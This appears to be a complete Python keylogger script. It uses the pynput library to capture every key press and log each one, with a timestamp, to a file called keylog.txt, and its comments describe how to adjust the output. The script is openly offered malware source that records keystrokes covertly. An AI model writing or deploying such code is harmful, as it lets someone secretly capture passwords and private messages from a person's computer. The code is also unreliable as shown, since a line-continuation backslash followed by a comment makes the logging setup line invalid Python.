from pynput.keyboard import Key, Listener
import logging

logDir = ""

logging.basicConfig(filename=(logDir + "keylog.txt"), \ # File doesnt need to be called keylog.txt
    level=logging.DEBUG, format="%(asctime)s: %(message)s") # Formatting includes the time of the keystroke

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
